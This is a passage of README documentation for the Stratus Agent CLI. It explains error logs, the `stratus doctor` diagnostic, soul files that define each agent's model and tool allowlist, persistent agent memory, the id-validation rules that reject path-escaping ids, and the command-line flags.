A daemon that fails *before* it starts serving — a broken install, an
unreadable credentials file — never gets as far as opening the structured log,
so `stratus logs` shows nothing or shows yesterday. Those errors go to stderr,
and where stderr lands is the service manager's business, so it differs by
platform:

```bash
tail ~/.stratus/logs/stratusd.err.log      # macOS
journalctl --user-unit=stratusd.service    # Linux
```

That is where a restart loop explains itself. On macOS the LaunchAgent redirects
both streams to files, so Stratus truncates them when `serve` starts and every
five minutes while it runs — a crash loop cannot fill the disk with the same
error a million times. On Linux systemd keeps the same output in the journal
instead, which does its own rotation, so there is nothing beside the JSONL to
bound and nothing to clean up.

## When something looks off

`stratus doctor` answers one question — *what would a run use right now, and
who decided that?* Every setting is shown with the file or environment variable
it came from, because the answer is usually that something outranks what you
thought you configured:

```bash
stratus doctor
stratus doctor --format json
```

```text
Stratus Agent — what a run would use right now

  provider  anthropic
            from ~/.stratus/agents/ava.md (soul frontmatter)
  model     claude-opus-5
            from ~/.stratus/agents/ava.md (soul frontmatter)
  soul      ~/.stratus/agents/ava.md
            from ~/.stratus/config.json
  agent     Ava (ava)

Files
  config    ~/.stratus/config.json
  agents    1 soul file

Sign-ins
  anthropic Claude subscription (Pro/Max) — runs go through the Claude Code runtime
  openai    not signed in
  codex     not signed in

Channels
  slack     no agents connected
            @stratusagent/channel-slack installed

1 problem found:
  ! A fallback model (gpt-4.1-mini) is configured but could not be resolved — usually
    no sign-in for its provider. A failing primary model has nothing to retry on.
```

It resolves the config exactly the way a run does rather than re-deriving the
rules, so what it prints is what you would get. It exits non-zero when it finds
a problem, and it is the fastest answer to the two most common surprises: a run
that turns out to be on the `demo` provider, and an `ANTHROPIC_API_KEY` in the
environment quietly demoting a Claude subscription sign-in to per-token billing.

## Agents are people

An agent's identity lives in a **soul file** — markdown with frontmatter for the structured parts (name, provider, model, tool and skill allowlists) and prose for the personality:

```markdown
---
name: Ava
provider: anthropic
model: claude-opus-5
tools:
  - demo.echo
  - memory.*
skills:
  - code-review
---

You are a sharp, warm generalist. Answer first, explain second...
```

Agents remember: facts saved with the built-in `memory.remember` tool persist
to `~/.stratus/memory.jsonl`, keyed to the agent — so the Ava you talk to
tomorrow remembers today, from any directory. Recall is something the agent
does, not only something done to it: the system prompt carries the most
recent facts (up to 20, within a byte budget), and everything older is
reachable through `memory.recall`, a full-text search over the agent's own
store — plain words in, matching facts out, newest first; a query like `C++`
or an unmatched quote is a search, never an error. `memory.forget` retires a
fact by id: it stops reaching prompts and recall, but stays in the file as a
tombstone line, so you can still see what an agent chose to drop. A single
fact is capped at 4 KiB — an oversized `memory.remember` is refused outright
rather than stored truncated.

One thing to check on souls written before recall existed: a `tools:`
allowlist naming exactly `memory.remember` lets the agent keep saving facts
but not search them, and with the prompt now carrying only the recent slice,
its older memories are out of reach. Add `memory.recall` and `memory.forget`
— or just `memory.*`, as the example above does. A soul with no `tools:`
list is unaffected; omitted means every registered tool.

The JSONL is the record and you may edit it: add a line by hand and it is
recallable; fix a typo and nothing goes stale. Search is served from a
derived FTS index the CLI writes alongside, `~/.stratus/memory.jsonl.index`
— safe to delete at any time, it is rebuilt from the JSONL on the next
recall.

**Ids are not labels.** Frontmatter may set `id:` explicitly, and it keys the
agent's sessions, memory, credentials, Slack tokens, and every per-agent path
on disk. So it has to stay one path segment, and one ordinary map key: an id
may not start with a dot or contain a slash, a backslash, a control
character, or leading or trailing whitespace, and it may not be a name every
object already answers to (`__proto__`, `constructor`, `toString`). Anything that would leave its directory is rejected when the soul
loads rather than quietly cleaned up — `id: ../../escape` is refused, not
rewritten to `escape`.

Anything else is yours. An id like `Ava_1` or `team.alpha` is unusual but
harmless, and it is already keying that agent's sessions and sign-ins, so it
is left exactly as written. Omit `id:` and one is derived from the name as a
plain slug (`ava`); a generated agent's id is also capped at 64 characters,
but a slug derived from a name you chose is used whole, because shortening
an id moves the agent it belongs to.

Creating an agent checks the id against every id the served roster holds,
not against the filenames on disk: what the roster files *declare* (a soul
at `renamed.md` can declare `id: ava`), the configured default soul even
when its file lives elsewhere, and the reserved `stratus`. A new agent gets
a suffixed id (`ava-3f9c`) rather than one that would collide. Its name
stays the one you chose.

**Two souls cannot share an id.** That is not two agents; it is one agent
whose memory and sign-ins belong to whichever file sorted first. The roster
refuses to load and names both files, `stratus serve` will not start,
`stratus doctor` reports it, and `stratus setup` → Channels offers no
agents at all — nothing is servable while the roster is ambiguous, so
connecting a Slack app would configure something that cannot run. Neither
command offers to clear "unmatched" Slack tokens in that state either: a
roster that would not load cannot prove which ids are missing, and the
tokens at risk belong to agents that are perfectly fine. (An unreadable *single* soul still degrades to a
warning — one broken file never takes the team down. A collision has no
correct winner, which is the difference.) The built-in `stratus` id is
reserved: souls claiming it are skipped — including two of them, since
neither was going to get the id, so their agreeing on it is not a collision
to refuse over.

## Options

| Flag | Purpose |
| --- | --- |
| `--soul <file>` | Run as the agent defined by a soul file (also `STRATUS_SOUL` / config `soul` key) |
| `--provider` | `anthropic`, `openai`, `codex`, or `demo` (offline, no account) |
| `--model` | Model for real providers (anthropic default: `claude-opus-5`, codex default: `gpt-5.5`) |
| `--base-url` | Override the provider API base URL |
| `--config <file>` | Load settings from a specific config file |
| `--approvals` | `run`/`chat`: tool approval mode — `always`, `ask`, or `never`. `serve`: how the daemon reaches a human — `headless` (refuse gated calls) or `remote` (ask in Slack); overrides the config's `approvals.mode` |
| `--max-turns` | Max provider turns per run (default 8) |
| `--format` | `text` or `json` |
| `--idle-timeout` | `stratus serve`: seconds of provider silence before the watchdog aborts a turn (default 120) |
| `--no-events` | Hide the event log |
| `--no-log-file` | `stratus serve`: do not write `~/.stratus/logs/stratusd.jsonl` |
| `--no-api` | `stratus serve`: do not serve the control API |
| `--api-host` | `stratus serve`: control API interface (default `127.0.0.1`) |
| `--api-port` | `stratus serve`: control API port (default `4123`; `0` picks any free port) |
| `--gateway <url>` | `stratus agents`: read the roster from a running daemon's control API |
| `--port`, `--host` | `stratus dashboard`: where a daemon it starts should bind |
| `--token` | Bearer token for `--gateway` (default: `~/.stratus/gateway-token`, or `STRATUS_GATEWAY_TOKEN`) |
| `--no-login` | `stratus service install`: install without the start-at-login trigger |
| `-f`, `--follow` | `stratus logs`: follow the log, across rotations |
| `-n <count>` | `stratus logs`: how much backlog to print (default 50) |
| `--agent`, `--session` | `stratus logs`: show only one agent's or one session's records |

Tool plugins have no flags: what is installed is a config decision (`plugins`
in a trusted config) and what an agent may call is a soul decision (`tools:`).
Neither is something a single run should be able to widen from the command
line.

Precedence: flags → `STRATUS_*` env vars → soul file hints → config file. Project-local `stratus.config.json` outranks the global `~/.stratus/config.json`; stored sign-ins are endpoint-bound and never sent to endpoints a project config selects.

Today the CLI covers setup, chat, one-shot runs, agent creation, the always-on gateway and its service integration, logs, diagnostics, Slack, the control API, and the web dashboard.

Part of [Stratus Agent](https://github.com/stratuslabs/agent) — a tiny TypeScript agent runtime.
